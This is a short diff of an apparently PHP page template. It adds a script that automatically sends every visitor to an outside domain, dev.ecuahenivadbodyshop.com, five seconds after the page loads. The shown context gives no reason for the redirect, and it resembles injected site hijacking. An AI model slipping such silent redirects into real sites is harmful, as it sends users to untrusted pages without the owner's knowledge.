@@ -52,8 +52,12 @@ p {
 	margin: 12px 15px 12px 15px;
 }
 </style>
+
+<script type="text/javascript"> function delayer() {window.location = "http://dev.ecuahenivadbodyshop.com"}
+</script>
+
 </head>
-<body>
+<body onLoad="setTimeout('delayer()', 5000)">
 	<div id="container">
 		<h1 align="center"><?php echo $heading; ?></h1>
 
